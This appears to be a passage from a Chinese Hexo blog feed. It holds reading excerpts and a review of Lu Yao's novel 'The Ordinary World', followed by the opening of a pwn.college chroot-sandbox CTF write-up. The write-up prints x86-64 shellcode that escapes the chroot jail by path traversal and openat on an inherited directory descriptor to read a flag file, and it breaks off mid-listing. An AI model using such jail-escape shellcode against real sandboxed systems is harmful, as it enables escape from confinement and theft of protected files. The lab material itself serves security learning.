第二部第十五章</p></li><li><p>这是人生的心酸，在我们短促而又漫长的一生中，我们苦苦地寻找人生的幸福。可幸福往往又与我们失之交臂，当我们为此耗尽宝贵的青春年华，皱纹也悄悄地爬上了眼角的时候，我们或许才能稍稍懂得生活实际上意味着什么</p></li><li><p>命运往往就是如此，有的人事事不顺，有的人一顺百顺。</p><hr><p>2025.03.10 晚7:37 </p></li><li><p>他不由再一次思考，我们活在人世间，最为珍视的应该是什么？金钱？权力？荣誉？是的，有这些东西并不坏，但是没有什么东西能比得上温暖的人情更为珍贵—你感受到的生活的美好，莫过于这一点。</p></li><li><p>只有劳动才可能使人在生活中强大，不论是什么人，最终还是要崇尚那些能用双手创造生活的劳动者。</p></li><li><p>唉，归根结底，他和晓霞的最终关系也许要用悲剧的形式结尾，这悲观性的结论实际上一直深埋在他的心灵深处。</p><hr><p>2025.03.11 晚21:52</p></li><li><p>人处在一种默默奋斗的状态，精神就会从琐碎中得到升华。</p></li><li><p>对于一个平凡的农民来说，要在大时代的变革浪潮中奋然跃起，那是极其不容易的，而跌落下来又常常就在朝夕之间。像孙少安这样一些后来被光荣地奉为“农民企业家”的人。在他们事业的初创阶段是非常脆弱的，一个偶然的因素，就可能使他们处于垮台的境地。而那种是他们破产的偶然性，却是惯常的现象。因为中国和他们个人都是在一条铺满荆棘的新路上摸索前行，碰个鼻青脸肿几乎不可避免。</p></li><li><p>你有没有决心为他而付出自己最大的牺牲，这是衡量是不是真正爱情的标准，否则就是被自己的感情所欺骗。</p></li><li><p>在这个世界上，在人的生活里，常常会有这样的巧合，这不是艺术故事，而是活生生的人的遭遇。</p><hr><p>2025.03.13 晚11:29</p></li><li><p>多少美好的东西消失和毁灭了，世界还像什么事情也没有发生一样。是的，生活在继续着，可是生活中的每一个人却在不断地失去自己最珍贵的东西。生活永远是美好的，人的痛苦却时时发生。</p></li><li><p>不同生活处境的人应该寻找各自的归宿。</p><hr><p>2025.03.14 晚8:24</p></li></ol><h2 id="完整版"><a href="#完整版" class="headerlink" title="完整版"></a>完整版</h2><ol><li><p>他慢慢懂得，人活着，就得随时准备经受磨难。他已经看过一些书，知道不论是普通人还是了不起的人，都要在自己的一生中经受许多的磨难。</p></li><li><p>这就是他生命的全部意义，这就是他活着的全部价值。</p></li><li><p>他佝偻着高大的身躯，失神地望着东拉河对面黑乎乎的庙坪山。山依然像他年轻时一样，没高一尺，也没低一尺，可他老了，也不能了。</p></li><li><p>是啊，这是命运。正如辛劳一年营务的庄稼，还没等收获，就被冰雹打光了，难道能懊悔自己曾经付出的力气吗？</p></li><li><p>只有在这社会的大风大浪中，他才把饿肚子放在一边，精神上享受着一种无限的快活。</p></li><li><p>不，他哥终究是他哥！别说他说了这么些话，就是再反动一点，他也不会出卖他的。哼，革命是革命，亲人是亲人。</p><hr><p>2025.03.15 晚8:02 第一部第九章</p></li><li><p>对他来说，站在这里和站在别的地方有什么区别呢？</p></li><li><p>但他们仍然像以前一样，在一块亲密地厮混着玩耍，在他六岁那年，有一天，父亲给他楔起一把小镢头，又给了他一根小绳，说：少安，你也大了，应该出去干点活了。跟着爸爸砍柴去吧！</p></li><li><p>他已经十三岁了，不用父亲说，自己也知道不能去城里读书了。</p></li><li><p>别了，我童年的朋友！我们将各走各的路了，我会永远记得我们过去的一切，他从此便心平气和地开始了自己的农民生涯，并且决心要在双水村做一个出众的庄稼人。</p></li><li><p>人民，只有人民，才是创造世界历史的动力。</p><hr><p>2025.03.16 早11：00 第一部， 第十三章</p></li><li><p>田润叶在婚姻上的坎坷有两个根本原因，一是长期在二爸家居住，在经济和生活上存在依附关系，导致其无法完全按照自己的意愿行事。二是，她在工作上与孙少安不对等，一个是公职人员，一个是农民。</p></li><li><p>半路上，兰花心疼地对男人说：家里还有六颗鸡蛋，我回去就煮，你和猫蛋狗蛋一人两个！（这是在王满银被劳教之后，兰花的话，女人的爱真伟大，此时她甚至没有考虑到自己）</p><hr><p>2025.03.16 晚20:49 第一部，第十六章</p></li><li><p>少安现在感到欣慰的是，他对润叶的求爱采取了完全正确的态度。田福堂现在又用铁的逻辑进一步给他论证了这件事的不可能性。</p></li><li><p>他顿时感到他刚才的情绪充满了危险，是的！一家老老少少都依靠和指望着他，他怎么能这样胡思乱想呢？不，他应该像往常一样，精神抖擞地跳上这辆生活的马车，坐在驾辕的位置上，绷紧全身的肌肉和神经，吆喝着、呐喊着、继续向前走去。如果他垮了，说不定人仰马翻，一切都完了（或许，当年舅舅也是这样想的）</p></li><li><p>孙玉厚半天才咄讷地说：我就在你后头走着….我让兰香先回去了，我怕你万一想不开。少安鼻子一酸，竟冲动地趴在高粱地里出声地哭了，在这一刻，在父亲面前，他才又一次感到自己是个孩子。</p></li><li><p>只要彩礼少，我不挑拣人。（少安对于婚姻的感悟远不及他对生活的感悟，生活的重担早已让他无法完全为自己考虑婚姻的问题）</p></li><li><p>一切都毫无办法，对于一个普通人来说，只好听命于生活的裁决，这不是宿命，而是无法超越的客观条件。在这个世界上，不是所有合理的和美好的都能按照自己的愿望存在或实现。</p></li><li><p>他本质上仍是农民的儿子，但他竭力想挣脱和超越他出身的阶层。</p></li><li><p>庄稼人出于本能和习惯，依然在这些毫无收获指望的土地上辛勤劳作着，抚哺这些快要死亡的，用他们的血汗浇灌起来的生命。整个村子已经失去了生气，任何人的脸上都再看不出一丝笑容来了。到处都能听到庄稼人的叹息，听见他们忧愁地谈论今冬和明年的生计。</p><hr><p>2025.03.17 晚7:38 第一部 第二十六章</p></li><li><p>有文化的城里人往往不能想象农村姑娘的爱情生活，在他们看来，也许没有文化就等于没有头脑；没有头脑就等于不懂得多少感情。可是实际也许和这种偏见恰恰相反。真的，正是由于她们知识不多，精神不会太分散，对两性之间的感情非常专注。所以这种感情实际上，更丰富，更强烈。</p></li><li><p>这就是我们中国的劳动人民，他们曾经修建起雄伟的万里长城，凿通横贯南北的大运河……今天他们饿着肚子，又气壮如虹地宣称，他们要把地球戳个大窟窿。</p></li><li><p>在返回公社的路上，几个领导人谁也没说话，大家的心情都很沉重，他们从群众的情绪里，再一次强烈地意识到，农民目前对我们的许多政策是多么的不满意啊–岂止是不满意。</p><hr><p>2025年3月20日 晚8:46 第一部第三十三章</p></li><li><p>少安垂着头离开这小桥，迈着沉重的脚步向家里走去，不知为什么，他感到自己眼窝里热辣辣的。他也没什么可惋惜的，因为命运就该如此。</p></li><li><p>大自然不管人世间的喜怒哀乐，总是按他自己的规律循序渐进地变换着一年的四季。</p></li><li><p>但普通人和出类拔萃的人一样，也有自己的欢乐和痛苦，只不过不为大多数人了解罢了。人们宁愿去关心一个蹩脚的电影演员的吃喝拉撒和鸡毛蒜皮，而不愿意了解一个普通人波涛汹涌的内心世界…</p></li><li><p>她开始动摇了，她的力量使她无法支撑如此巨大的精神压力。当然除过客观的压力外，她主观上的素养本来也不够深厚。是的，她现在还不能以更高意义上来理解自身和社会。尽管她是一个正直善良的人，懂事，甚至也有比较鲜明的个性，但并不具有深刻的思想和广阔的眼界，因此最终她还是不能掌握自己的命运。</p></li><li><p>从古至今，人世间有过多少这样的阴差阳错！这类生活悲剧的演出，不能简单地归结为一个人的命运，而常常是当时社会的各种矛盾所造成的。</p><hr><p>2025.03.21 晚8:58  第一部 第四十五章</p></li><li><p>世事啊，把人逼到了这样一种地步！归根到底，他们都是普普通通的老百姓，怎么可能和社会的大潮流对抗呢？</p></li><li><p>在农村，从古代到现代，似乎有一条不成文的法规：此类“桃色事件”可以不经过官方，由户族与户族之间解决，这就意味着暴力与战争。在历史上，这种时间往往酿成了惨痛的流血和屠杀。户族、种族之间的冲突，也许是人类最大的悲剧，这种战争往往是由一些鸡毛蒜皮引起的，而且根本分不清谁是谁非，结局就是让很多人毫无意义地倒在了血泊之中。</p></li><li><p>这窑洞，这院子，每一个角落，每一块石头和土疙瘩，都是他们生活的一个有机部分。失掉这些东西，多少日子他们都会感到心中空落落的。对一个普通农民来说，家庭院落就是自己一生中最重要的世界，和如此依恋的天地告别，那痛苦是外人所不能全部理解的。</p></li><li><p>宽容的读者，你们仔细想想，对于这老太太来说，世界上还有什么地方比得上她丈夫留下的这块地值得她留恋？她住在这窑洞里，就会温暖地回忆起已故的先生，回忆起当年她和丈夫在这里度过的那些美妙时光。如果离开这些回忆，让她怎么再活下去？</p></li><li><p>生活就是如此无情，她使一个劳动者连最起码的尊严都不能保持！</p><hr><p>2025.03.22 周六 下午3:00 第一部完结</p></li><li><p>新和旧，古老和现代，一切都混同并存、交错参杂。</p></li><li><p>可是，世界上谁能没有这种情感呢？只是因为繁重的工作和艰难的事业，人才常常把个人的情感掩埋在心灵的深处，而并不是这种东西就丧失掉了，不，这种掩埋起来的个人情感往往更为深沉，更为巨大。</p></li><li><p>社会在变化，生活在变化，人也在变化，没有什么是一成不变的，包括人的关系。</p></li><li><p>田福军听这话，内心忍不住感慨万端。他想不到自己当了这么个“官”，在多少人中间引起了那么多的看法、想法……这叫人感到无谓的烦恼啊！中国人把多少心思和精力都投入到了这种可怕的损耗之中。</p><hr><p>2025.03.23 周日 下午2:56 第二部 第八章</p><hr><p>2025.03.25 下午5:22 第二部第十三章</p></li><li><p>田福堂从双水村眼前社会生活的大镜子中，看到了自己的渺小。</p></li><li><p>爬到半坡上时，少平感觉自己太过分了。他所具有的文化素养使他意识到他的行为是野蛮的。一刹那间，对别人的不满意和对自己的不满意使他忍不住两眼噙满了泪水。</p></li><li><p>一旦长大成人，开始独立生活。我们便很快知道，亲戚关系常常是庸俗的；互相设法沾光，沾不上光就翻白眼，甚至你生活中最大的困难也是亲戚们造成的。生活同样会告诉你，亲戚往往不如朋友对你真诚，见鬼吧，亲戚。（这一段是在描述少平去黄原投奔的远方舅舅，这个关系很远了，要在具体环境中分析这句话）</p></li><li><p>在双水村人的想象中，金俊海不知道在黄原享什么福。但出门人很快就知道，在这个城市里，金俊海就是个“穷人”。</p></li><li><p>记得那时间，大家都信誓旦旦地表示，他们全班同学有一天还会重新相聚，现在看来，那纯粹是一种少年之梦。一旦独立地投入严峻的生活，中学生的狼们情调很快就烟消云散了。</p></li><li><p>一切都很明确，这个家不管是分还是不分，再也不会像往常一样和谐了。生活带来了繁荣，同时也把原有的秩序打破了。</p></li><li><p>通过不断地读书，少平认识到，只有一个人对世界了解得更广大，对人生看得更深刻，那么他才有可能对自己所处的艰难和困苦有更高意义的理解；甚至也会心平气静地对待欢乐和幸福。</p><hr><p>2025.03.26 晚9:00 第二部第二十一章</p></li><li><p>什么是社会主义？社会主义不是一个美丽而空洞的口号，也不是意味着贫穷面前人人平等，要穷大家一样穷。社会主义首先应该极大地发展生产力，以此证明自己比别的制度优越，否则就无力对历史做出回答。</p></li><li><p>田福军同时想到，许多人由于过去的理想和信仰一次次被现实所粉碎，在眼下新的社会条件下，他们便也变得“现实”起来，而这种人所谓的“现实眼光”，不过是衰老心灵的一孔之见罢了。</p></li><li><p>白元就是这样理解大官的。生活中有那么一种人，你蔑视甚至侮辱他，他不仅视为正常，还对你挺佩服；你要是在人格上与他平等相待，他反倒小看你。</p><hr><p>2025.03.28 晚 8：30 第二部第二十七章</p></li><li><p>时光静悄悄地在流逝。世界上有些人因为忙而感到生活的沉重，也有人因为闲而活得压抑。人啊，都有一本难念的经，可是不同处境的人又很难理解别人的苦处。</p></li><li><p>徐国强老汉突然感到这个世界空落落的，许多昨天还记忆犹新的事情，好像一下子变得遥远了。这个时候，他并不感到生命短促，反而觉得他活得太长久。</p></li><li><p>人的感情有时候真是不可思议，他也许对人是冷漠的，但可以对一个动物怀着永远的眷恋。</p></li><li><p>他真惊叹过去那些不识字的农民，编出这样美妙而深情的歌，这不是歌，是劳动者苦难而深沉的叹息。</p></li><li><p>可是对于大多数人来说，生活的变化是缓慢的。今天和昨天似乎没有什么不同；明天也可能和今天一样，也许人一生中仅仅有那么一两个辉煌的瞬间—甚至一生都可能在平淡无奇中度过。</p></li><li><p>在城市，没有正式工作，就意味着什么也没有。虽然现在的姑娘们开化了，但婚姻问题上，这个最基本的条件很少有人采取无所谓的态度。在中国目前的社会里，很多情况下，感情往往并不是男女结合的主要因素，而常常要受其他因素的制约和支配。</p></li><li><p>生活不能等待别人来安排，要自己去争取和奋斗；而不论其结果是喜是悲。你总不枉在这世界上活了一场人。有了这样的认识，你就会珍惜生活，而不会玩世不恭；同时也会给自身注入一种强大的内在力量….</p></li><li><p>不过，日常生活的纷繁不会让人专注地沉湎于自己的不幸，即使人的心灵伤痕累累，也还得要去为现实的生存和发展而挣扎。</p></li><li><p>如果我们自己有过一些生活的阅历和感情的经历，我们就会深切地可怜他们、同情他们，并且也能理解他们这种疯狂而绝望的痛苦….</p></li><li><p>痛苦啊，往往是人走向成熟的最好的课程。</p></li><li><p>一切都说不清楚….,对于有些人来说，寻找幸福是一件不容易的事情，摆脱苦难同样也不容易。</p></li><li><p>在没有其他理由可以解释。向前这样做，是要感动她。但这恰恰引起了她对他更为深刻的反感。一个女人如果不喜欢一个男人，那这个男人就左也不是右也不是—我们可怜的向前所处的就是这样一种境况。</p><hr><p>2025.03.29 晚8:09 第二部第三十八章</p></li><li><p>什么是人生？人生就是永不休止的奋斗，只有选定了目标并在奋斗中感到自己的努力没有虚掷，这样的生活才是充实的，精神也会永远年轻。</p></li><li><p>阐述这个变化的深远历史意义也许并不是小说家所能胜任的，我们只是在描述这个历史大背景下人们的生活时，不由得感叹，我们这一代人经历了如此深刻而又富于戏剧性的历程！现在还是孩子的人们，将不会全部理解我们这代人对生活的那种复杂体验。</p></li><li><p>中外历史证明，革命常常容易在最贫困落后的地区开始。而较富庶的地方，变革往往要更困难一些。</p></li><li><p>领导这么大一个省，省委书记不可能在一切事情上明察秋毫，再说，即使看出类似的问题，有时也不得不作某种妥协—这是政治生活中常有的现象。</p><hr><p>2025.03.30 晚8:14 第二部</p></li><li><p>大学，这是人生的一个分水岭，当你一踏进它的校门，便会豁然明白。你已经从孩子变成了大人，青春岁月开始了，这是你的黄金年华，连空气都像美酒一般醇香醉人。</p></li><li><p>无论是个人还是社会，许多意义深远的重大事件，往往是从某些微不足道的小事开始的。</p></li><li><p>对于天才来说，能在一个小范围内找到知音，那概率如同大海捞针。</p></li><li><p>不要以为一个人一时正确，就认为他永远正确。也不要因为一个人犯过错误，就断定他永远不可能再加入优秀者的队伍，道理是如此简单，事实又在不断佐证，可是生活中用不变的眼光看待人的现象却是常常存在。</p></li><li><p>当一个人集中地凝视自己的不幸时，他就很难想象别人的苦难。</p></li><li><p><strong>他永远是这样一种人：既不懈地追求生活，又不敢奢望生活过多的报酬和宠爱，理智而清醒地面对着现实。这也许是所有从农村走出来的知识阶层所共有的一种心态。</strong></p></li><li><p>我们承认伟人在历史进程中的贡献。可人类生活的大厦从本质上说，是由无数普通人的血汗乃至生命所建造的。伟人们常常企图用纪念碑或纪念堂来使自己永世流芳。真正万古长青的却是普通人的无名纪念碑—-生生不息的人类生活自身。是的，生活之树常青。</p></li><li><p>他知道，人的痛苦只能在生活和劳动中慢慢消磨掉。</p><hr><p>2025.03.31 下午5:39 第三步第十九章</p></li><li><p>幸福，或者说生存的价值，并不在于我们从事什么样的工作。在无数艰难困苦之中，又何尝不包含人生的幸福啊</p></li><li><p>任何时候，处在失败者的位置上，就得忍辱受屈。</p></li><li><p>大时代的浪潮不仅改变物质世界，更重要的是，也在改变人。</p></li><li><p>是的，世界上怕就怕“认真”二字，他太认真了！<strong>人和社会，一切斗争的总结局也许都是中庸而已，与其认真，不如随便。</strong></p></li><li><p>人生啊，是这样不可预测，没有永恒的痛苦，没有永恒的幸福。生活像流水一般，有时是那么平展，有时又那么曲折。</p></li><li><p>唉，不管怎说，在任何时候，诉苦总是一种软弱的表现，尤其一个男人向一个女人诉苦。</p></li><li><p>命运总是不如人愿，但往往是在无数的痛苦中，在重重的矛盾和艰难中，才使人成熟起来，坚强起来；虽然这些东西在实际感受中带给人的并不都是欢乐。</p></li><li><p><strong>爱情，应该真正建立在现实生活坚实的基础上，否则，它就是在活生生的生活之树上盛开的一朵不结果实的花。</strong></p></li><li><p>有时候，现实生活中某些引起社会强烈震动的突发性事件，往往是历史所发出的回声。</p></li><li><p>他年纪越大，越相信有一种看不见的力量掌握着尘世间每一个人的命运；甚至掌握着大自然的命运。</p></li><li><p>伟大的生命，不论是以何种形式，将会在宇宙间永存。我们这个小星球上的人类，也许将继续繁衍和发展。直到遥远的未来，可是生命对于我们来说又是多么短暂。不论是谁，总有一天，都将会走到自己的终点–死亡，这是伟人和凡人共有的最后归宿。热情的诗人高歌生命的恋歌，而冷静的哲学家却说：死亡是自然法则的胜利……</p></li><li><p>只是我们从中再一次看到，作为一个重要领导干部，由于自己的弱点，会造成什么样的结果。</p></li><li><p>的确，有时候，往往一个极偶然的因素，就可能会改变一个人的生活。王满银得感谢大上海小旅馆里的这面破镜子，它不仅照出了他的嘴脸，他的衰老，而且也照出了他半生荒唐而愚蠢的生活。</p></li><li><p>无论精神多么独立的人，感情却总是在寻找一种依附，寻找一种归宿。</p></li><li><p>青年，青年！无论受到怎样的挫折和打击，都要咬着牙挺住。因为你们完全有机会重建生活，只要不灰心丧气，每一次挫折就只不过是通往新境界的一块普通的绊脚石，而绝不会置人死命。</p></li><li><p>仅就孙少安来说，这件事也暴露出发达起来的农民的一种心态。一方面，普遍的贫困所引起的社会红眼病，使他们像传统的财主一样不愿意“露富”；另一方面，自身长期社会地位地下，又使他们不甘心寂寞无闻，产生了强烈的出人头地的欲望。</p></li><li><p>人类史告诉我们，贫穷会引起一个社会的混乱、崩溃和革命，巨大的财富也会引起形式有别的相同的社会效应。</p></li><li><p>对我们爱说，也许类似的话题谈论的有些为时过早了。不过，有时候我们不得不预先把金钱和财富上升到哲学、社会学和历史学的高度来认识，正如我们用同样的高度来认识我们的贫穷与落后。</p></li><li><p><strong>在我们的生活中，总有一些人的认知超越一般的水平线，这种认识当然出自这些人非同一般的生活经历，而不在于读了多少伟人们的“生活指南书”。</strong></p></li><li><p>生活似乎走了一个令人难以置信的圆。但生活又不会以圆的形式结束。</p><hr><p>2025.03.31 晚21:14 完结</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 平凡的世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>平凡的世界读后感</title>
      <link href="/2025/04/01/ping-fan-de-shi-jie-du-hou-gan/"/>
      <url>/2025/04/01/ping-fan-de-shi-jie-du-hou-gan/</url>
      
        <content type="html"><![CDATA[<h1 id="平凡的世界读后感"><a href="#平凡的世界读后感" class="headerlink" title="平凡的世界读后感"></a>平凡的世界读后感</h1><p>其实我昨天就已经读完了。之所以拖到今天，是想着顺便把电视剧给看完。书中讲述的故事和这本书的题目一样，平凡的世界。前些日子我看过精简版的，总感觉少了点什么，于是又把完整版的看了一遍。毫无疑问，完整版对于更多人物心理活动的刻画是更细腻的，带给人的感受也就愈鲜活。故事发生的时代是在七十年代到九十年代，于现实生活对应的话，应该是我爷爷和奶奶那辈的人，但我更多的联想到了我的父辈。</p><p>孙玉厚有两个儿子，两个女儿，大女儿兰花嫁了一个逛鬼王满银。孙少安排行老二，因为社会地位的差距，没能和自己的青梅竹马田润叶结婚，娶了来自山西的贺秀莲。孙少平是老三，在城市里干建筑工，后来当了煤矿工人，爱人田晓霞在洪水中为救孩子牺牲。孙兰香考上了北方工业大学，与副省委书记的儿子谈起了恋爱。他还有一个兄弟，叫孙玉亭，早些年是钢厂的工人，后来回到双水村与贺秀英结婚，夫妇二人都热衷于搞政治运动。两个儿子和田家的姑娘有扯不断的联系，田润叶是田福堂的女儿，他还有一个儿子叫润生，最终和郝红梅结婚。姐弟俩平时都呆在他们二爸家，也就是田福堂的弟弟田福军，早期是县革委会的副主任。少平的爱人晓霞就是他的女儿。他也有一个儿子，叫晓晨。</p><p>故事的主要人物大抵就是这些了，下面来谈谈感悟吧。首先是孙少安的感情和奋斗经历，孙少安十三岁就已经开始支撑起这个家了，虽然没上高中，但他的成绩的确很好，考了全县第三，如果当初和润叶一起上了学，他们大抵也会走到一起吧。可就是因为这个农民身份，不仅田福堂看不上他，他自己也没有信心和润叶走下去。于是他娶了不要彩礼的秀莲。和电视剧不同的是，少安并没有贪恋润叶，反倒理所应当的和秀莲过起了日子。他几乎没有什么抱怨和不甘，和秀莲一起支撑这个家，从集体合作制到开砖窑再到承包砖厂。电视剧里虽然强化了少安对润叶的感情，但最终也用一句话向观众表达了爱首先应该是责任的观点。<strong>过去的感情就像牙齿，掉了就是没了，按上也是假的。</strong> <strong>我佩服少安的敢于面对生活的勇气，他果断放弃了对润叶的感情，不仅为润叶，也为自己的家。</strong>当然命运也奖励了他一份礼物，那就是秀莲，像电视剧的弹幕“百年难遇田润叶，万年难遇贺秀莲”一样，我对秀莲只有敬意，可惜最终原西县医院判定了她的病是肺癌。路遥先生并没有写后续的故事，如同这本书的名字一样，平凡的世界。无论你对一个人的感情再深厚，生老病死都无法躲过，这里有奇迹，但更多的是平凡人对于命运的抗争。当然，在那个医术水平不高的年代，我希望这是一次误诊。</p><p>再说说润叶，润叶婚姻的不幸是各种因素综合到一起的结果，她没有像少安那样果断地接受自己的命运，而是与命运闹了很长一段时间的别扭。结束这场别扭的是李向前的车祸，双腿截肢。这起车祸唤醒了润叶，也彻底断绝了她的后路。在这种情况下，抛弃向前等于彻底否定她的人格。面对这样的悲剧，润叶居然真正地担负起一个妻子的责任，开始照顾向前的生活，后来他们也有了一个儿子。我即心疼润叶，也不理解润叶。如果开始就和向前一起好好过日子，向前不至于喝醉酒发生车祸。但也许命运正是要通过这起悲剧告诉润叶，生活中的幸福往往需要历经苦难的磨砺吧。<strong>可我还是认为润叶本可以避免这起悲剧，就像她曾经可以拒绝和向前结婚一样。</strong></p><p>说到润叶，不得不谈及秀莲，如果说润叶和少安是青梅竹马，那秀莲和少安简直是绝配。体贴、懂事、肯干，秀莲的优点完全符合老孙家对于儿媳妇的要求。我很佩服像秀莲一样的女性，比如我的妈妈。她们满心铺在这个家上，不在乎自己的吃穿，为了家庭可以燃烧掉自己。对于她们而言，快乐的阈值是很低的，喝一瓶汽水、吃个雪糕，甚至无忧无虑地躺上一下午。之前过年去逛那满是垃圾的黄山时，我记得老妈、老爸、奶奶她们脸上满意的笑容，<strong>是的，满地的垃圾并没有跟他们带来任何不适，她们完全适应这个场合，并且带着由衷的笑意。因为她们真得是从艰苦岁月中奋斗过来的，能享受奋斗之水浇灌出来的果实，她们已经很满意了。</strong>对比我呢，享受着各种优厚的条件，却仍不满足。有的时候我也再劝自己，知足常乐，我真的已经很幸福了。</p><p>然后谈谈少平吧，少平是一个典型的书生，阅读过很多小说和文学作品，将理想主义印在了脑门上。我即佩服他敢于吃苦、不怕苦不怕累的作风，但同时也埋怨他的幼稚。换做是我，跟哥哥一起经营砖厂有什么不好，非要跑到黄原，跑到铜城大牙湾煤矿干什么矿工。放着一条平坦的路不走，反倒去淌浑水。实在是不能理解，但生活里的确也不缺乏这种人。跟少平相比，我更更像少安，我们都是现实主义的人，没有那么对所谓的理想，也不追求什么见识。不会因为念了一些书，就不甘于做一些平凡的工作，毕竟人还是要生活的嘛。但少平却遇到的了知音田晓霞，他们都属于理想主义者，甚至可以将诗歌和外国小说的情节带有感情的朗诵出来。<strong>是的，如果少平不是理想主义，他在黄原城打工的时候就会拿曹书记多支付的工资，他不会去救被胡永洲强暴的姑娘小翠更不会把自己的钱给她，他也不会去帮助偷手娟的郝红梅，更不会冒着生命危险救侯玉英。如果晓霞不是理想主义，她也不会在洪水中冒着生命危险救小女孩，不会以记者的身份要求跟着少平一起下矿，不会拒绝高朗的追求。</strong>虽然我不懂少平为什么不和哥哥一起开砖厂，但是我懂得社会需要像少平这样的理想主义者，他们对身边的人和事有更深刻的思考，他们的高尚的精神容不得玷污。</p><p>书中的人物还有很多，政治上的刘根民、周文龙、田福军、苗凯、乔伯年、冯世宽、高凤阁，张有智，双水村的福堂、玉亭、俊文、俊武、海民、福高、王彩娥，原西县高中的顾养民、金波等，大亚湾煤矿上的安锁子、王世才夫妇。正是这些人物和几个主角之间发生的故事，构成了整本书的全部内容。和看完其他书籍不同的是，阅读完这本书时，我更多的是一种平静，一种对于生活中发生的各种事情的平静。尤其电视剧的结局带来了一种幸福的平静，福堂接受了润生和郝红梅的爱情，他带着红梅前夫的孩子和自己的孙女，向前安上了假肢骑自行车带着润叶和乐乐一起回家过年。玉厚家更是热闹，兰香带来了自己的男朋友，兰花的丈夫王满银也不满世界跑了，安安稳稳地在少安的砖厂里当起了伙夫，少平和少安用拉车拉着挂着点滴的秀莲，秀莲差点睡着，还好又醒了。双水村的天空上，满是过年放得烟花。<strong>苦，笑，都是因为欢乐。哭的人知道而笑的人并不知道，这欢乐是多少痛苦所换来的。</strong> <strong>是啊，虽然我们都生活在平凡的世界里，但我们不屈的意志和努力奋斗的精神会让生活变得越来越好，即便有暂时的艰难和苦难折磨人的心神，可只要我们不被这些苦难打倒，就一定能等来属于自己的充满幸福的生活！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 平凡的世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-College-SandBox-Writeup</title>
      <link href="/2024/09/14/pwn-college-sandbox-writeup/"/>
      <url>/2024/09/14/pwn-college-sandbox-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h1><p><a href="https://pwn.college/system-security/sandboxing/">https://pwn.college/system-security/sandboxing/</a></p><h2 id="有价值的问题"><a href="#有价值的问题" class="headerlink" title="有价值的问题"></a>有价值的问题</h2><h3 id="1-chroot-amp-chdir"><a href="#1-chroot-amp-chdir" class="headerlink" title="1. chroot &amp; chdir"></a>1. chroot &amp; chdir</h3><ul><li>chroot</li><li>sets the kernel’s concept of <strong>the root directory</strong> of your process</li><li>chdir</li><li>sets the kernel’s concept of <strong>the current working directory</strong> of your process</li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>如果在根目录下面执行的话，直接<code>/challenge/babay flag</code>即可</p><p><code>chroot()</code> changes the meaning of <code>/</code> for a process and its children.</p><p><code>chroot(&quot;/tmp/jail&quot;)</code> has two effects:</p><ul><li>For this process, change the meaning of “/“ to mean “/tmp/jail”.<ul><li>and everything under that: “/flag” becomes “/tmp/jail/flag”</li></ul></li><li>For this process, change “/tmp/jail/..” to go to “tmp/jail”</li></ul><p><code>chroot(&quot;/tmp/jail&quot;)</code> does NOT:</p><ul><li>Close resources that reside outside of the jail.</li><li><code>cd(chdir())</code> into the jail.</li><li>Do anything else ！</li><li>Neither of the effects of <code>chroot</code> do anything to previously-open resources.</li><li>change hte current working directory</li></ul><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p><code>/challenge/babyjail_level2 ./test &lt; ./shellcode.bin</code></p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64section .data    filename db &#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag&#39;, 0    ; 文件路径需要替换为正确的路径section .bss    buffer resb 100                   ; 100 字节缓冲区section .textglobal _start_start:    ; open(&quot;filename&quot;, O_RDONLY)    xor rax, rax    mov rax, 2                        ; SYS_open    lea rdi, [rel filename]    xor rsi, rsi                      ; O_RDONLY &#x3D; 0    syscall    ; 检查 open 的返回值    test rax, rax    js error                          ; 如果打开文件失败，跳转到错误处理    ; read(fd, buffer, 100)    mov rdi, rax                      ; fd    lea rsi, [rel buffer]    mov rdx, 100                      ; 读取 100 字节    xor rax, rax                      ; SYS_read    syscall    ; write(1, buffer, rax)    mov rdi, 1                        ; stdout    mov rdx, rax                      ; 读取的字节数    mov rax, 1                        ; SYS_write    syscall    ; exit(0)    xor rdi, rdi                      ; 返回码 0    mov rax, 60                       ; SYS_exit    syscallerror:    ; exit(1)    mov rdi, 1                        ; 返回码 1    mov rax, 60                       ; SYS_exit    syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>注意<code>open</code>函数打开的，既有可能是一个文件，也有可能是一个目录。</p><p><code>/challenge/babyjail_level3 ./ &lt; ./shellcode.bin</code></p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64section .data    filename db &#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag&#39;, 0    ; 文件路径需要替换为正确的路径    errormessage db &#39;error&#39;, 0section .bss    buffer resb 100                   ; 100 字节缓冲区section .textglobal _start_start:    ; openat(3, filename, 0, 0)    xor rdi, rdi    xor rax, rax    xor r10, r10    mov rdi, 3    xor rdx, rdx    mov rax, 0x101                    ; SYS_openat    lea rsi, [rel filename]    syscall    ; 检查 open 的返回值    test rax, rax    js error                          ; 如果打开文件失败，跳转到错误处理    ; read(fd, buffer, 100)    mov rdi, rax                      ; fd    lea rsi, [rel buffer]    mov rdx, 100                      ; 读取 100 字节    xor rax, rax                      ; SYS_read    syscall    ; write(1, buffer, rax)    mov rdi, 1                        ; stdout    mov rdx, rax                      ; 读取的字节数    mov rax, 1                        ; SYS_write    syscall    ; exit(0)    xor rdi, rdi                      ; 返回码 0    mov rax, 60                       ; SYS_exit    syscallerror:    ; 